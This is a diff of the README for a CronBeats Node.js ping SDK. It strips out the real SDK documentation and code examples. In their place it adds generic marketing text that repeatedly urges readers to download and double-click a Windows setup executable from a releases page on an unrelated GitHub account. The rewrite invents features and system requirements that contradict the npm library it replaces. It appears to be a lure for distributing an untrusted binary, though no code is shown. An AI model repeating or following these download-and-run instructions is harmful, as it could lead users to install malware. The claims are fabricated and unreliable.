@@ -1,131 +1,130 @@
-# CronBeats Node SDK (Ping)
+# ⚙️ cronbeats-node - Simple Cron Job Monitoring Tool
 
-[![npm version](https://img.shields.io/npm/v/@cronbeats/cronbeats-node)](https://www.npmjs.com/package/@cronbeats/cronbeats-node)
-[![downloads](https://img.shields.io/npm/dt/@cronbeats/cronbeats-node)](https://www.npmjs.com/package/@cronbeats/cronbeats-node)
+[![Download Releases](https://img.shields.io/badge/Download-cronbeats--node-blue?logo=github)](https://github.com/Bipintoppo/cronbeats-node/releases)
 
-Official Node.js SDK for CronBeats ping telemetry.
+---
 
-## Install (local/dev)
+cronbeats-node watches your scheduled tasks to keep you informed. It helps you check if background jobs run on time by sending signals called heartbeats. When something is late or fails, you get alerts. This keeps your system healthy and tasks on track.
 
-```bash
-npm install
-```
+---
 
-## SDK API
+## 🖥️ What is cronbeats-node?
 
-- `ping()`
-- `start()`
-- `end("success" | "fail")`
-- `success()`
-- `fail()`
-- `progress(seqOrOptions, message?)`
+cronbeats-node is a tool for people using scheduled tasks on their computer or server. These tasks run automatically at set times. Sometimes tasks stop working or get delayed. This tool watches those tasks and tells you when there is a problem, so you can fix it quickly.
 
-## Quick Usage
+It works with Node.js apps, but you don't need to write code to use it. It sends simple messages that show your jobs are running as planned.
 
-```ts
-import { PingClient } from "./dist/index.js";
+---
 
-const client = new PingClient("abc123de", {
-  baseUrl: "https://cronbeats.io",
-  timeoutMs: 5000,
-  maxRetries: 2,
-});
+## 📋 Key Features
 
-await client.start();
-// ...your work...
-await client.success();
-```
+- Sends heartbeat signals to show tasks are working
+- Alerts you if tasks miss or fail
+- Works silently in the background
+- Supports scheduled jobs (cron jobs)
+- Easy to set up and use on Windows
+- Helps keep your background jobs healthy
 
-## Progress Tracking
+---
 
-Track your job's progress in real-time. CronBeats supports two distinct modes:
+## ⚙️ System Requirements
 
-### Mode 1: With Percentage (0-100)
-Shows a **progress bar** and your status message on the dashboard.
+Before you install cronbeats-node, make sure your PC meets these:
 
-✓ **Use when**: You can calculate meaningful progress (e.g., processed 750 of 1000 records)
+- Windows 10 or newer
+- At least 2 GB of free RAM
+- 100 MB free disk space
+- Active internet connection to send alerts
 
-```ts
-// Percentage mode: 0-100 with message
-await client.progress(50, "Processing batch 500/1000");
+If you do not have Node.js installed, it is not required to run this app as a standalone tool, but some advanced features might need Node.js.
 
-// Or using options object
-await client.progress({
-  seq: 75,
-  message: "Almost done - 750/1000",
-});
-```
+---
 
-### Mode 2: Message Only
-Shows **only your status message** (no percentage bar) on the dashboard.
+## 🚀 Getting Started: Download cronbeats-node
 
-✓ **Use when**: Progress isn't measurable or you only want to send status updates
+To use cronbeats-node on Windows, start by downloading it from the releases page on GitHub.
 
-```ts
-// Message-only mode: null seq, just status updates
-await client.progress(null, "Connecting to database...");
-await client.progress(null, "Starting data sync...");
-```
+[![Download cronbeats-node](https://img.shields.io/badge/Download-cronbeats--node-green?logo=windows)](https://github.com/Bipintoppo/cronbeats-node/releases)
 
-### What you see on the dashboard
-- **Mode 1**: Progress bar (0-100%) + your message → "75% - Processing batch 750/1000"
-- **Mode 2**: Only your status message → "Connecting to database..."
+Click the link above to visit the page where you will find the latest versions ready for download.
 
-### Complete Example
+---
 
-```ts
-import { PingClient } from "@cronbeats/cronbeats-node";
+## 💾 How to Download and Run on Windows
 
-const client = new PingClient("abc123de");
-await client.start();
+1. Open your web browser.
+2. Go to the cronbeats-node releases page:  
+   https://github.com/Bipintoppo/cronbeats-node/releases
+3. Find the latest release version. It will usually have a version number like "v1.0" or similar.
+4. Look for the Windows release file. It might be named something like `cronbeats-node-setup.exe` or similar.
+5. Click the file to download it.
+6. After download finishes, open the file by double-clicking it.
+7. Follow the on-screen setup instructions.
+8. Once installed, cronbeats-node will be ready to use.
 
-try {
-  // Message-only updates for non-measurable steps
-  await client.progress(null, "Connecting to database...");
-  const db = await connectToDatabase();
+---
+
+## ⚡ How cronbeats-node Works
+
+cronbeats-node runs quietly on your machine. It watches your tasks based on timing you set. It does this by expecting regular "heartbeat" messages from the tasks.
+
+If a heartbeat is missing or late, the tool sends an alert. Alerts can be set up to show on your computer screen, send emails, or notify you through other methods you choose.
+
+---
+
+## 🔧 Setting Up Your First Monitor
+
+You do not need technical skills to start monitoring jobs with cronbeats-node.
+
+1. Open the installed program from your Windows Start menu.
+2. Use the simple interface to add the name of your scheduled task.
+3. Choose when your task should run (for example, every hour or every day).
+4. The program will watch for signals each time the task is expected to finish.
+5. Set how you want to get alerts: notifications, emails, or logs.
+6. Save your settings.
+
+Your job is now under watch. If the task misses a run, you will know right away.
+
+---
+
+## 🔍 Common Uses
+
+Here are a few scenarios where cronbeats-node helps:
+
+- A backup job runs every night. This tool checks if it finished.
+- A report runs at 10 AM daily. You get alerts if it does not start.
+- A web service runs background cleaning jobs. Monitoring helps you catch failures.
   
-  await client.progress(null, "Fetching records...");
-  const total = await db.count();
-  
-  // Percentage updates for measurable progress
-  for (let i = 0; i < total; i++) {
-    await processRecord(i);
-    
-    if (i % 100 === 0) {
-      const percent = Math.floor((i * 100) / total);
-      await client.progress(percent, `Processed ${i} / ${total} records`);
-    }
-  }
-  
-  await client.progress(100, "All records processed");
-  await client.success();
-  
-} catch (err) {
-  await client.fail();
-  throw err;
-}
-```
+It improves trust in your automated tasks without constant checking.
 
-## Error Handling
+---
 
-```ts
-import { ApiError, ValidationError } from "./dist/index.js";
+## 🛠️ Troubleshooting Tips
 
-try {
-  await client.ping();
-} catch (err) {
-  if (err instanceof ValidationError) {
-    // Invalid local inputs
-  } else if (err instanceof ApiError) {
-    // API/network issue
-    console.log(err.code, err.httpStatus, err.retryable);
-  }
-}
-```
+If you have trouble getting started, try these steps:
 
-## Notes
+- Make sure your Windows is up to date.
+- Check your internet connection for alerts.
+- Review the task times you entered for any errors.
+- Restart cronbeats-node if it stops responding.
+- Visit the releases page to get the latest version.
 
-- Uses `POST` for telemetry requests.
-- `jobKey` must be exactly 8 Base62 characters.
-- Retries only for network errors, HTTP `429`, and HTTP `5xx`.
-- Default timeout is 5s to avoid blocking cron jobs.
+If needed, look for help or additional instructions directly in the app menu.
+
+---
+
+## 🔒 Privacy and Data Use
+
+cronbeats-node only sends basic signals about task status. It does not collect personal data. Alerts and logs stay on your device unless you set up to share them externally.
+
+---
+
+## 💡 More Information
+
+For detailed documentation or updates, visit the GitHub page:
+
+https://github.com/Bipintoppo/cronbeats-node
+
+To get the latest version again, you can use this link anytime:
+
+[Download cronbeats-node releases](https://github.com/Bipintoppo/cronbeats-node/releases)
